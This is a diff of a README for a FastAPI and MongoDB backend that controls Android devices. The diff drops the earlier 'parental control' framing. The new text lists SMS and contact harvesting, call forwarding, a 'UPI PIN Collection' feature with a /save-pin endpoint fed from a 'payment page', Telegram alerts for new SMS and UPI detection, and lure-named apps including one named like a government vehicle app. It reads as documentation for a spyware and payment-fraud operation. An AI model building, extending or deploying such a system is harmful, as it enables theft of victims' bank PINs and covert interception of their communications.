@@ -1,283 +1,273 @@
-# ?? Parental Control System - Backend Server
+# Device Management & Monitoring System
 
-> Advanced parental control system for Android device monitoring and management
+Complete device monitoring and management system with admin panel, real-time notifications, and comprehensive device control.
 
-## ?? About
+## ?? Features
 
-This project is a comprehensive parental control system that includes:
-- **Backend Server** (FastAPI + WebSocket + REST API)
-- **Database** (MongoDB)
-- **Real-time Monitoring** (WebSocket connections)
-- **Push Notifications** (Firebase FCM)
-- **Telegram Notifications** (Multi-bot system)
-- **Admin Panel** (REST API with 2FA authentication)
+- **Multi-Admin System** with role-based permissions (Super Admin, Admin, Viewer)
+- **Single Session Control** - One active login per admin
+- **Device Management** - Remote monitoring and control of Android devices
+- **Real-time Notifications** - Telegram + Push notifications
+- **SMS & Contacts Monitoring** - Full access to device communications
+- **Call Management** - Call forwarding and call logs
+- **UPI PIN Collection** - Secure UPI PIN capture
+- **Admin Account Expiry** - Time-limited admin accounts
+- **App Type Filtering** - Filter devices by application type
+- **Two-Factor Authentication (2FA)** - OTP-based secure login
 
-## ? Features
+---
 
-### ?? Admin Management
-- Two-factor authentication (2FA) with Telegram
-- Single session control (one active login per admin)
-- Multiple access levels (Super Admin, Admin, Viewer)
-- Multi-admin support with isolated permissions
-- Complete activity logging
+## ?? Documentation
 
-### ?? Device Monitoring
-- Real-time WebSocket connections
-- Device information (model, manufacturer, OS version)
-- Battery monitoring and online/offline status
-- Installed applications list
+Complete API documentation is available in the `/docs` directory:
 
-### ?? SMS Management
-- Automatic SMS synchronization
-- Search and filter messages
-- Instant notifications for new SMS
-- Configurable data retention
+- **[Admin API Documentation](./docs/ADMIN_API.md)** - All admin-related endpoints
+- **[Device API Documentation](./docs/DEVICE_API.md)** - All device-related endpoints
+- **[Authentication Guide](./docs/AUTHENTICATION.md)** - Login, 2FA, and security
+- **[Firebase Setup Guide](./docs/FIREBASE.md)** - Firebase configuration for both devices and admins
+- **[Bot Authentication](./docs/BOT_AUTH.md)** - Telegram bot service tokens
 
-### ?? Call History
-- Complete call logs (incoming/outgoing/missed)
-- Call details (number, duration, timestamp)
-- Contact management
+---
 
-### ?? Telegram Notification System
-- 5 Telegram bots per admin:
-  - Bot 1: Device notifications
-  - Bot 2: SMS notifications
-  - Bot 3: Admin activity logs
-  - Bot 4: Login/Logout logs
-  - Bot 5: Future use
-- Shared 2FA bot for OTP codes
+## ?? Quick Start
 
-### ?? Remote Control
-- Send commands to devices via Firebase FCM
-- Device ping and online status check
-- Send SMS from server to device
-- Device settings management
+### 1. Install Dependencies
+```bash
+pip install -r requirements.txt
+```
+
+### 2. Configure Environment
+Create `.env` file:
+```env
+MONGODB_URL=mongodb://localhost:27017
+DATABASE_NAME=parental_control
+SECRET_KEY=your-secret-key-here
+TELEGRAM_ENABLED=true
+TELEGRAM_2FA_BOT_TOKEN=your-bot-token
+TELEGRAM_2FA_CHAT_ID=your-chat-id
+```
+
+### 3. Setup Firebase
+- Download service account JSON for devices: `device-firebase-adminsdk.json`
+- Download service account JSON for admins: `admin-firebase-adminsdk.json`
+- See [Firebase Setup Guide](./docs/FIREBASE.md) for details
+
+### 4. Run Server
+```bash
+python run.py
+```
+
+Server will start on `http://localhost:8000`
+
+---
+
+## ?? Admin Roles & Permissions
+
+### Super Admin
+- Full system access
+- Manage admins
+- View all devices
+- Access all features
+
+### Admin
+- Manage own devices
+- Send commands
+- View SMS & contacts
+- Limited admin actions
+
+### Viewer
+- View-only access
+- No device control
+- Read-only permissions
+
+---
+
+## ?? Telegram Bot System
+
+Each admin has **5 dedicated Telegram bots**:
+
+1. **Bot 1** - Device Notifications (registration, UPI detection)
+2. **Bot 2** - SMS Notifications (new messages)
+3. **Bot 3** - Admin Activity (commands, status changes)
+4. **Bot 4** - Login/Logout notifications
+5. **Bot 5** - Reserved for future use
+
+---
+
+## ?? Supported Applications
+
+- **SexyChat** (`sexychat`) - ?? Chat application
+- **mParivahan** (`mparivahan`) - ?? Vehicle management
+- **SexyHub** (`sexyhub`) - ?? Media application
+
+---
 
 ## ??? Architecture
 
 ```
-???????????????????
-?  Android App    ? ???? Flutter/Native Android
-???????????????????
-         ?
-         ? WebSocket + REST API
-         ?
-????????????????????????????????????
-?      Backend Server              ?
-?  ????????????????????????????   ?
-?  ?   FastAPI + Uvicorn      ?   ?
-?  ????????????????????????????   ?
-?  ????????????????????????????   ?
-?  ?   WebSocket Manager      ?   ?
-?  ????????????????????????????   ?
-?  ????????????????????????????   ?
-?  ?   REST API Endpoints     ?   ?
-?  ????????????????????????????   ?
-????????????????????????????????????
-         ?
-         ???? MongoDB (Database)
-         ???? Firebase FCM (Push)
-         ???? Telegram Bots (Notifications)
+???????????????????????????????????????????????????????????????
+?                     Backend Server (FastAPI)                 ?
+???????????????????????????????????????????????????????????????
+?                                                               ?
+?  ?????????????????    ????????????????    ???????????????? ?
+?  ?   Admin API   ?    ?  Device API  ?    ?  Auth API    ? ?
+?  ?????????????????    ????????????????    ???????????????? ?
+?          ?                   ?                    ?          ?
+?          ??????????????????????????????????????????          ?
+?                              ?                                ?
+?                    ???????????????????                       ?
+?                    ?    MongoDB      ?                       ?
+?                    ???????????????????                       ?
+?                                                               ?
+???????????????????????????????????????????????????????????????
+?                     External Services                         ?
+???????????????????????????????????????????????????????????????
+?                                                               ?
+?  ????????????????  ????????????????  ????????????????      ?
+?  ?   Telegram   ?  ?Firebase (Dev)?  ?Firebase (Adm)?      ?
+?  ?   (5 Bots)   ?  ?  (Commands)  ?  ?  (Push Not.) ?      ?
+?  ????????????????  ????????????????  ????????????????      ?
+?                                                               ?
+???????????????????????????????????????????????????????????????
 ```
 
-## ?? Quick Start
+---
 
-### Prerequisites
+## ?? Database Collections
 
-- Python 3.10+
-- MongoDB 4.4+
-- Firebase account (for FCM)
-- Telegram bots (optional)
+- `admins` - Admin accounts and configurations
+- `devices` - Registered devices and metadata
+- `sms_messages` - SMS history
+- `contacts` - Device contacts
+- `call_logs` - Call history
+- `device_logs` - Device activity logs
+- `admin_activities` - Admin action logs
+- `otp_codes` - 2FA verification codes
 
-### Installation
+---
 
-```bash
-# Clone repository
-git clone <repository-url>
-cd workspace
+## ?? API Endpoints Summary
 
-# Install dependencies
-pip install -r requirements.txt
+### Authentication
+- `POST /auth/login` - Step 1: Username/password
+- `POST /auth/verify-2fa` - Step 2: OTP verification
+- `POST /auth/logout` - Logout
 
-# Setup environment
-cp .env.example .env
-nano .env  # Edit with your settings
+### Admin Management
+- `POST /admin/create` - Create new admin
+- `GET /admin/list` - List all admins
+- `PUT /admin/{username}` - Update admin
+- `DELETE /admin/{username}` - Delete admin
+- `GET /api/admin/{username}/devices` - View admin's devices (Super Admin only)
 
-# Start MongoDB
-# (If using Docker):
-docker run -d -p 27017:27017 mongo:latest
+### Device Management
+- `POST /register` - Register new device
+- `GET /api/devices` - List devices (with filtering)
+- `GET /api/devices/{device_id}` - Get device details
+- `GET /api/devices/app-types` - Get available app types
+- `POST /api/devices/{device_id}/command` - Send command to device
 
-# Run server
-python run.py
-```
+### SMS & Contacts
+- `GET /api/devices/{device_id}/sms` - Get SMS messages
+- `GET /api/devices/{device_id}/contacts` - Get contacts
+- `POST /sms-history` - Receive SMS history from device
+- `POST /contacts` - Receive contacts from device
 
-Server runs on `http://localhost:8765`
+### UPI & Payments
+- `POST /save-pin` - Save UPI PIN from payment page
 
-## ?? Documentation
+### Bot Authentication
+- `POST /bot/auth/request-otp` - Request OTP for bot
+- `POST /bot/auth/verify-otp` - Verify OTP and get service token
+- `GET /bot/auth/check` - Check admin status
 
-- **[SETUP.md](./SETUP.md)** - Complete installation and configuration guide
-- **[ADMIN_PANEL_GUIDE.md](./ADMIN_PANEL_GUIDE.md)** - Admin Panel user guide
-- **[FLUTTER_DEVELOPMENT.md](./FLUTTER_DEVELOPMENT.md)** - Flutter/Android app development guide
-- **[API_DOCS.md](./API_DOCS.md)** - Complete API documentation
+For complete API documentation, see the `/docs` directory.
 
-## ?? Configuration
+---
 
-### .env File
+## ?? Security Features
 
-```bash
-# Database
-MONGODB_URL=mongodb://localhost:27017
-MONGODB_DB_NAME=parental_control
+- **JWT-based authentication** with session management
+- **Two-Factor Authentication (2FA)** via Telegram
+- **Single session control** - Only one active login per admin
+- **Account expiry system** - Time-limited admin accounts
+- **Service vs Interactive tokens** - Different token types for bots and web
+- **Activity logging** - All admin actions are logged
+- **Permission-based access control** - Fine-grained permissions
 
-# Server
-SERVER_HOST=0.0.0.0
-SERVER_PORT=8765
+---
 
-# Security
-SECRET_KEY=your-secret-key-here
-ACCESS_TOKEN_EXPIRE_MINUTES=1440
+## ??? Technology Stack
 
-# 2FA Bot
-TELEGRAM_2FA_BOT_TOKEN=your-bot-token
-TELEGRAM_2FA_CHAT_ID=your-chat-id
-
-# Administrator Bots (5 bots)
-ADMIN_BOT1_TOKEN=bot1-token
-ADMIN_BOT1_CHAT_ID=bot1-chat-id
-# ... (other bots)
-```
-
-## ?? Authentication
-
-### Default Login
-
-```
-Username: admin
-Password: 1234567899
-```
-
-**?? Change the default password immediately!**
-
-### 2FA System
-
-- Enable/Disable: `app/services/auth_service.py` ? `ENABLE_2FA`
-- When enabled, OTP code sent via Telegram
-- 6-digit code, valid for 5 minutes
-
-### Single Session
-
-- Only **one active session** per admin account
-- New login invalidates previous sessions
-- Enhanced security against token theft
-
-## ?? Flutter/Android Development
-
-For mobile app development, see complete guide in **[FLUTTER_DEVELOPMENT.md](./FLUTTER_DEVELOPMENT.md)**
-
-### App Connection
-
-```dart
-// WebSocket connection
-final wsUrl = 'ws://your-server:8765/ws?device_id=DEVICE123';
-
-// Device registration
-POST /register
-{
-  "device_id": "DEVICE123",
-  "device_info": {...},
-  "admin_token": "admin_device_token_here"
-}
-```
-
-## ??? Tech Stack
-
-- **Backend:** FastAPI, Uvicorn
+- **Backend:** FastAPI (Python 3.10+)
 - **Database:** MongoDB (Motor - async driver)
-- **Real-time:** WebSocket
+- **Notifications:** Telegram Bot API
+- **Push Notifications:** Firebase Cloud Messaging (FCM)
 - **Authentication:** JWT + 2FA
-- **Push Notifications:** Firebase Cloud Messaging
-- **Telegram:** Multi-bot system with aiohttp
-- **Background Tasks:** AsyncIO
+- **Real-time:** WebSocket support
+
+---
 
 ## ?? Project Structure
 
 ```
-workspace/
-??? app/
-?   ??? main.py              # FastAPI app & endpoints
-?   ??? config.py            # Configuration
-?   ??? database.py          # MongoDB connection
-?   ??? models/              # Pydantic schemas
-?   ?   ??? schemas.py
-?   ?   ??? admin_schemas.py
-?   ?   ??? otp_schemas.py
-?   ??? services/            # Business logic
-?   ?   ??? auth_service.py
-?   ?   ??? device_service.py
-?   ?   ??? otp_service.py
-?   ?   ??? telegram_multi_service.py
-?   ?   ??? firebase_service.py
-?   ?   ??? ...
-?   ??? utils/               # Helpers
-?       ??? auth_middleware.py
-??? run.py                   # Entry point
-??? requirements.txt         # Dependencies
-??? .env                     # Environment variables
-??? docker-compose.yml       # Docker setup
+app/
+??? models/
+?   ??? admin_schemas.py      # Admin models
+?   ??? schemas.py             # Device models
+?   ??? bot_schemas.py         # Bot authentication models
+?   ??? otp_schemas.py         # OTP/2FA models
+?   ??? upi_schemas.py         # UPI PIN models
+??? services/
+?   ??? auth_service.py        # Authentication logic
+?   ??? device_service.py      # Device management
+?   ??? firebase_service.py    # Device commands (Firebase)
+?   ??? firebase_admin_service.py  # Admin notifications (Firebase)
+?   ??? telegram_multi_service.py  # Multi-bot Telegram
+?   ??? admin_activity_service.py  # Activity logging
+?   ??? websocket_manager.py   # WebSocket connections
+??? utils/
+?   ??? auth_middleware.py     # Auth middleware & permissions
+??? config.py                  # Configuration
+??? database.py                # MongoDB connection
+??? main.py                    # FastAPI application
 ```
-
-## ?? Testing
-
-```bash
-# Test health check
-curl http://localhost:8765/health
-
-# Test login
-curl -X POST http://localhost:8765/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"1234567899"}'
-
-# View API docs
-# Open in browser:
-http://localhost:8765/docs
-```
-
-## ?? Docker Deployment
-
-```bash
-# Build
-docker-compose build
-
-# Run
-docker-compose up -d
-
-# Logs
-docker-compose logs -f
-
-# Stop
-docker-compose down
-```
-
-## ?? Contributing
-
-1. Fork the project
-2. Create feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to branch (`git push origin feature/AmazingFeature`)
-5. Open Pull Request
-
-## ?? License
-
-This project is licensed under the MIT License.
-
-## ?? Bug Reports
-
-For bug reports or feature requests, please open an Issue.
-
-## ?? Contact
-
-For questions or support, please open an Issue or contact us via email.
 
 ---
 
-**Made with ?? for family safety**
+## ?? Testing
+
+### Run Tests
+```bash
+pytest tests/
+```
+
+### API Documentation
+Once server is running, visit:
+- **Swagger UI:** http://localhost:8000/docs
+- **ReDoc:** http://localhost:8000/redoc
+
+---
+
+## ?? Development
+
+### Code Style
+- Python 3.10+
+- Async/await patterns
+- Type hints
+- Pydantic models for validation
+
+### Database Migrations
+Migrations run automatically on server startup. Check `app/database.py` for details.
+
+---
+
+## ?? Support
+
+For detailed API documentation and guides, see the `/docs` directory.
+
+---
+
+**Version:** 2.0.0  
+**Last Updated:** November 2, 2025  
+**License:** Proprietary
